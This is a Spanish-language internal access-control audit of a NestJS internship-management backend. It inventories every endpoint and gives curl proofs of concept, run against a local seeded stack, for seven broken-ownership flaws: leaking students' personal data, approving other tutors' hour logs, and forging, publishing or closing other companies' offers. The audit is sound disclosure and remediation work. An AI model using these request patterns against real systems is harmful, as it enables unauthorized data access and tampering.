# E3-01 · Auditoría de permisos de endpoints

**Épica:** E3 — Seguridad y control de acceso
**Sprint:** 2
**Alcance:** backend NestJS (`src/`) y rutas de UI del frontend (ver [docs del frontend](../../demo-practicas-preprofesionales-frontend-c10-g1/docs/E3-01-rutas-ui.md)).

Este documento es un inventario — no cambia código del sistema. Lista cada endpoint HTTP del backend, el rol o roles permitidos para llamarlo, y si el handler/service verifica **pertenencia** (que el recurso identificado por el id de la ruta pertenezca al usuario autenticado). Para cada fila marcada como *"no comprueba pertenencia"* se adjunta un `curl` reproducible que demuestra si el agujero es explotable con los usuarios del seed.

El resultado se usa para abrir las historias hijas de E3 (ver §4).

---

## 1 · Modelo de autorización actual

Dos guards vigilan la cadena:

- **`JwtAuthGuard`** (`src/auth/guards/jwt-auth.guard.ts`): valida `Authorization: Bearer <token>`, carga `req.user` desde el JWT verificado. Payload: `{ sub, email, role }`. Si falta el token o es inválido devuelve `401`.
- **`RolesGuard`** (`src/auth/guards/roles.guard.ts`): lee el metadata `ROLES_KEY` del decorator `@Roles(...)` (handler o clase). Si no hay roles declarados, deja pasar. Si hay, exige que `req.user.role` esté en la lista; si no, `403`.

El decorator `@Roles(...roles)` (`src/auth/decorators/roles.decorator.ts`) solo hace `SetMetadata(ROLES_KEY, roles)`.

**Lo que no hay:** ningún guard, interceptor o decorator verifica **pertenencia**. Si un endpoint `PATCH /recurso/:id` debe exigir que `recurso.ownerId === req.user.sub`, esa comprobación tiene que estar escrita a mano en el handler o en el service. Donde no está escrita, cualquier usuario con el rol permitido puede operar sobre cualquier id. Ese es el patrón que esta auditoría busca.

Convenciones de las tablas:

- **Roles permitidos**: lo que exige el `@Roles(...)` del handler, o del `@Controller(...)` de la clase si el handler no lo redefine. "cualquier autenticado" cuando solo hay `JwtAuthGuard` sin `@Roles`. "público" cuando no hay guard de auth.
- **¿Verifica pertenencia?**: *Sí* si el handler/service compara el id de la ruta contra `req.user.sub` (o `user.companyId`) antes de leer o mutar. *No* si opera por id crudo. *N/A* si el endpoint no identifica un recurso de un usuario (listado global, acción exclusiva del coordinador, etc.).

---

## 2 · Inventario completo (26 endpoints en 8 módulos)

### 2.1 `auth`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 1 | POST | `/auth/login` | público | N/A | Devuelve `{ accessToken, user }`. |

### 2.2 `application`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 2 | POST | `/applications` | STUDENT | Sí | `studentId = req.user.sub`. |
| 3 | GET | `/offers/:offerId/applications` | COMPANY, COORDINATOR | **No** | `listByOffer(offerId)` filtra solo por `offerId`. Ver [H-01](#h-01). |
| 4 | GET | `/applications/me` | STUDENT | Sí | `where: { studentId: req.user.sub }`. |
| 5 | PATCH | `/applications/:id/decide` | COMPANY, COORDINATOR | **No** | `decide(id, status)` no compara `application.offer.companyId` con `user.companyId`. Ver [H-02](#h-02). |

### 2.3 `company`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 6 | GET | `/companies` | cualquier autenticado | N/A | Listado global. |
| 7 | POST | `/companies` | COORDINATOR | N/A | Creación global por coordinador. |

### 2.4 `evaluation`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 8 | POST | `/evaluations` | TUTOR, COMPANY, STUDENT | Sí | `assertCanSubmit` verifica según rol: TUTOR == `placement.tutorId`, COMPANY tiene `user.companyId == placement.companyId`, STUDENT == `placement.studentId`. También acopla `kind` al rol. |
| 9 | GET | `/placements/:id/evaluations` | cualquier autenticado | Sí | Permite COORDINATOR, el `studentId` o el `tutorId` del placement; cualquier otro recibe `403`. Observación menor: COMPANY no puede leer aunque sí pueda enviar. |

### 2.5 `hour-log`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 10 | POST | `/hour-logs` | STUDENT | Sí | `service.create` carga el placement y rechaza si `placement.studentId !== studentId`. |
| 11 | GET | `/placements/:id/hour-logs` | cualquier autenticado | Sí | `assertPlacementAccess` permite COORDINATOR, `placement.studentId` o `placement.tutorId`. |
| 12 | GET | `/placements/:id/progress` | cualquier autenticado | Sí | Mismo `assertPlacementAccess`. |
| 13 | PATCH | `/hour-logs/:id/review` | TUTOR | **No** | `service.review(id, status, reviewerId, note)` nunca compara `log.placement.tutorId` contra `reviewerId`. Ver [H-03](#h-03). |

### 2.6 `offer`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 14 | GET | `/offers` | cualquier autenticado | N/A | Catálogo público entre autenticados; filtra `PUBLISHED`. |
| 15 | GET | `/offers/me` | COMPANY | Sí | Resuelve `user.companyId` del `req.user.sub` y filtra por esa empresa. |
| 16 | GET | `/offers/:id` | cualquier autenticado | **No** | Devuelve la oferta sin filtrar por estado. Ver [H-04](#h-04). |
| 17 | POST | `/offers` | COMPANY, COORDINATOR | **No** | Persiste el `companyId` que viene en el DTO. Ver [H-05](#h-05). |
| 18 | PATCH | `/offers/:id/publish` | COMPANY, COORDINATOR | **No** | Solo valida estado `DRAFT`. Ver [H-06](#h-06). |
| 19 | PATCH | `/offers/:id/close` | COMPANY, COORDINATOR | **No** | Solo valida estado `PUBLISHED`. Ver [H-07](#h-07). |

### 2.7 `placement`

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 20 | GET | `/placements/accreditation` | COORDINATOR | N/A | Reporte global del coordinador. |
| 21 | POST | `/placements` | COORDINATOR | N/A | Crea el placement desde una postulación aceptada. Observación menor: no valida que el `tutorId` del DTO tenga rol `TUTOR`. |
| 22 | GET | `/placements/me` | STUDENT | Sí | `where: { studentId: req.user.sub }`. |
| 23 | PATCH | `/placements/:id/activate` | COORDINATOR | N/A | Acción exclusiva del coordinador. |
| 24 | POST | `/placements/:id/documents` | STUDENT, COORDINATOR | Sí | `addDocument` rechaza con `403` si STUDENT y `placement.studentId !== uploadedById`; COORDINATOR puede subir a cualquier placement. |

### 2.8 `sync`

El `SyncController` usa **solo** `JwtAuthGuard` (sin `RolesGuard`), así que cualquier rol autenticado accede. La pertenencia la hace el service.

| # | Método | Ruta | Roles | ¿Pertenencia? | Nota |
|---|---|---|---|---|---|
| 25 | GET | `/sync/pull?since&limit` | cualquier autenticado | Sí | `service.pull(req.user.sub, …)` filtra placements, hourLogs, documents y evaluations por `OR: [{ studentId: userId }, { tutorId: userId }]`. |
| 26 | POST | `/sync/push` | cualquier autenticado | Sí | `applyOperation(userId, op)` valida `placement.studentId === userId` para `create`, y para `update`/`delete` carga el `hourLog` con `include: { placement: true }` y valida `existing.placement.studentId === userId`. También respeta la máquina de estados (rechaza mutar `APPROVED`/`REJECTED`). |

**Observación sobre `sync`:** aunque la pertenencia es correcta, el controller no impone un rol mínimo. Un usuario `COMPANY` o `COORDINATOR` autenticado puede llamar `/sync/pull`; recibirá un resultado vacío porque el `where` no matchea placements donde él sea student o tutor, pero el endpoint responde `200`. No es un agujero funcional — solo un detalle de superficie que una historia de endurecimiento podría cerrar añadiendo `@Roles(STUDENT, TUTOR)`.

---

## 3 · Hallazgos explotables (los 7 agujeros)

Todos los `curl` siguientes se ejecutaron contra `http://localhost:3000/api` con el seed por defecto (`pnpm db:seed`). Los efectos destructivos fueron revertidos por SQL después de cada prueba — la base queda limpia.

Reproducible con este bloque de setup (una sola vez, exporta los JWT a variables):

```bash
E0=$(curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"empresa0@miyura.com","password":"yura1234"}' | jq -r .accessToken)
E1=$(curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"empresa1@miyura.com","password":"yura1234"}' | jq -r .accessToken)
T0=$(curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"tutor0@miyura.com","password":"yura1234"}' | jq -r .accessToken)
T1=$(curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"tutor1@miyura.com","password":"yura1234"}' | jq -r .accessToken)
S0=$(curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" \
  -d '{"email":"estudiante0@miyura.com","password":"yura1234"}' | jq -r .accessToken)
```

Mapa de los actores del seed usados abajo:

- `empresa0@miyura.com` → `User.id=10`, `companyId=1` (Empresa 0)
- `empresa1@miyura.com` → `User.id=11`, `companyId=2` (Empresa 1)
- `tutor0@miyura.com` → `User.id=2`, tutor asignado a `Placement.id=1` (estudiante 0)
- `tutor1@miyura.com` → `User.id=3`, tutor asignado a `Placement.id=2` (estudiante 1)
- `estudiante0@miyura.com` → `User.id=22`, dueño de `Placement.id=1`

### H-01 · Fuga de PII de postulantes a ofertas ajenas

- **Endpoint:** `GET /offers/:offerId/applications` (#3)
- **Roles permitidos:** COMPANY, COORDINATOR
- **Severidad:** Alta (PII — emails y nombres completos de estudiantes).

Prueba — `empresa0` (companyId=1) consulta las postulaciones de la oferta `4` que pertenece a `empresa1` (companyId=2):

```bash
curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $E0" \
  http://localhost:3000/api/offers/4/applications
```

Resultado observado: **HTTP 200**. La respuesta trae 6 postulaciones con `student.email` y `student.fullName` visibles. **Explotable.**

### H-02 · Decidir postulaciones de ofertas ajenas

- **Endpoint:** `PATCH /applications/:id/decide` (#5)
- **Roles permitidos:** COMPANY, COORDINATOR
- **Severidad:** Alta (manipulación de proceso de selección de otra empresa).

Preparación — el estudiante crea una postulación nueva sobre una oferta de `empresa1` para no reusar postulaciones ya decididas:

```bash
APP_ID=$(curl -s -X POST -H "Authorization: Bearer $S0" -H "Content-Type: application/json" \
  -d '{"offerId":4,"motivation":"Esta es una motivacion de al menos veinte caracteres para pasar la validacion."}' \
  http://localhost:3000/api/applications | jq -r .id)
```

Ataque — `empresa0` rechaza la postulación de la oferta de `empresa1`:

```bash
curl -s -w "\nHTTP %{http_code}\n" -X PATCH -H "Authorization: Bearer $E0" \
  -H "Content-Type: application/json" -d '{"status":"REJECTED"}' \
  "http://localhost:3000/api/applications/$APP_ID/decide"
```

Resultado observado: **HTTP 200**, `status: "REJECTED"` escrito. **Explotable.**

### H-03 · Un tutor aprueba o rechaza horas de un practicante que no le fue asignado

- **Endpoint:** `PATCH /hour-logs/:id/review` (#13)
- **Roles permitidos:** TUTOR
- **Severidad:** Crítica (compromete la fe pública del acta de acreditación).

El servicio recibe `reviewerId = req.user.sub` y lo escribe en `reviewedById`, pero nunca lo compara con `log.placement.tutorId`.

Prueba — `tutor1` (id=3) aprueba un `hour-log` del placement 1 que pertenece a `tutor0`:

```bash
curl -s -w "\nHTTP %{http_code}\n" -X PATCH -H "Authorization: Bearer $T1" \
  -H "Content-Type: application/json" -d '{"status":"APPROVED"}' \
  http://localhost:3000/api/hour-logs/16/review
```

Resultado observado: **HTTP 200**, `"status":"APPROVED","reviewedById":3`. El registro queda aprobado y, por `/sync/pull`, llega al estudiante como si el tutor correcto lo hubiera revisado. **Explotable.**

### H-04 · Lectura de ofertas DRAFT o CLOSED por cualquier autenticado

- **Endpoint:** `GET /offers/:id` (#16)
- **Roles permitidos:** cualquier autenticado
- **Severidad:** Media (fuga de ofertas no publicadas — inteligencia competitiva).

El listado `GET /offers` sí filtra por `PUBLISHED`, pero `GET /offers/:id` no.

Preparación — crear una oferta DRAFT (puede usarse el agujero H-05, o un `INSERT` directo si se audita en limpio).

Prueba — con una oferta `id=37` en estado `DRAFT`, un estudiante la lee entera:

```bash
curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $S0" \
  http://localhost:3000/api/offers/37
```

Resultado observado: **HTTP 200**, cuerpo completo con `"status":"DRAFT"` y datos de la empresa. **Explotable.**

### H-05 · Crear una oferta atribuyéndola a otra empresa

- **Endpoint:** `POST /offers` (#17)
- **Roles permitidos:** COMPANY, COORDINATOR
- **Severidad:** Alta (suplantación de empresa en el catálogo).

El handler persiste el `companyId` tal como viene en el DTO.

Prueba — `empresa0` (companyId=1) crea una oferta con `companyId: 2` (empresa1):

```bash
curl -s -w "\nHTTP %{http_code}\n" -X POST -H "Authorization: Bearer $E0" \
  -H "Content-Type: application/json" -d '{
    "companyId": 2,
    "title": "Oferta falsa suplantando a Empresa 1",
    "description": "Prueba E3-01",
    "modality": "PRESENCIAL",
    "seats": 1,
    "requiredHours": 240,
    "periodStart": "2027-01-01",
    "periodEnd": "2027-06-30"
  }' http://localhost:3000/api/offers
```

Resultado observado: **HTTP 201**, oferta creada con `"companyId": 2`. **Explotable.**

### H-06 · Publicar ofertas DRAFT de otra empresa

- **Endpoint:** `PATCH /offers/:id/publish` (#18)
- **Roles permitidos:** COMPANY, COORDINATOR
- **Severidad:** Alta (sabotaje — publicar sin autorización una oferta en borrador de otra empresa).

Prueba — con la oferta `37` del hallazgo H-05 en DRAFT, `empresa0` la publica:

```bash
curl -s -w "\nHTTP %{http_code}\n" -X PATCH -H "Authorization: Bearer $E0" \
  http://localhost:3000/api/offers/37/publish
```

Resultado observado: **HTTP 200**, `"status":"PUBLISHED","publishedAt":"..."`. **Explotable.**

### H-07 · Cerrar ofertas PUBLISHED de otra empresa

- **Endpoint:** `PATCH /offers/:id/close` (#19)
- **Roles permitidos:** COMPANY, COORDINATOR
- **Severidad:** Alta (sabotaje — cerrar la oferta de un competidor interrumpe su proceso de selección).

Prueba — `empresa0` cierra la oferta `4` que pertenece a `empresa1`:

```bash
curl -s -w "\nHTTP %{http_code}\n" -X PATCH -H "Authorization: Bearer $E0" \
  http://localhost:3000/api/offers/4/close
```

Resultado observado: **HTTP 200**, `"status":"CLOSED"`. **Explotable.**

---

## 4 · Hallazgos → propuesta de historias hijas

Priorizadas por impacto y por acoplamiento (los tres de `offer` comparten el mismo patrón "verificar `offer.companyId === user.companyId`", conviene cerrarlos juntos).

| Prioridad | Hallazgo(s) | Historia propuesta (candidata al tablero) | Esfuerzo estimado |
|---|---|---|---|
| 1 | H-03 | **E3-02 (candidata) — Solo el tutor asignado puede aprobar o rechazar horas de su plaza.** Fix: cargar el `hourLog` con `include: { placement: true }` en `review()` y rechazar con 403 si `log.placement.tutorId !== reviewerId`. Test de regresión: tutor ajeno recibe 403. | 3 pts |
| 2 | H-05, H-06, H-07 | **E3-03 (candidata) — Una empresa solo administra sus propias ofertas.** Fix compartido: resolver `user.companyId` del `sub` y validar `offer.companyId === user.companyId` en los tres handlers (`create`, `publish`, `close`). COORDINATOR mantiene bypass explícito. | 5 pts |
| 3 | H-01, H-02 | **E3-04 (candidata) — Una empresa solo ve y decide postulaciones a sus propias ofertas.** Fix: en `listByOffer` y `decide`, cargar `offer.companyId` y validar contra `user.companyId`. | 3 pts |
| 4 | H-04 | **E3-05 (candidata) — Las ofertas no publicadas no se filtran por `GET /offers/:id`.** Fix: filtrar por estado `PUBLISHED` cuando el solicitante no sea la empresa dueña o COORDINATOR. | 2 pts |

Observaciones menores que no abren historia nueva pero pueden entrar como "nota" en las historias de arriba o quedarse en `KNOWN_ISSUES.md`:

- `SyncController` sin `RolesGuard` — detalle de superficie, no es agujero funcional (ver §2.8).
- `POST /placements` no valida que el `tutorId` del DTO tenga rol `TUTOR` — es inconsistencia de dominio, no un agujero de acceso.

---

## 5 · Rutas de UI (frontend)

El frontend protege sus 14 rutas con `RequireRole` (`src/auth/RequireRole.tsx`), que verifica `role` del `AuthContext`. Es **defensa en profundidad** — un usuario que forje un `role` localmente en `localStorage` seguiría encontrando `401` o `403` del backend al llamar a los endpoints. La autoridad vive en el backend.

El inventario de rutas de UI está en el repo del frontend: [`docs/E3-01-rutas-ui.md`](../../demo-practicas-preprofesionales-frontend-c10-g1/docs/E3-01-rutas-ui.md).

---

## 6 · Metodología y limitaciones

- Se leyeron los 8 controllers y sus services, los dos guards y el decorator `@Roles`.
- Se verificó cada hallazgo con un `curl` real contra el stack levantado con el seed por defecto. Los efectos destructivos fueron revertidos por SQL (`UPDATE/DELETE`) después de cada prueba.
- **No** se auditaron: capa de WebSockets (no existe), rate limiting (no implementado), configuración de CORS, cadena de validación del DTO (`class-validator`), ni la fortaleza del JWT (D-07 ya la nombra). Esos quedan para otras historias de E3.
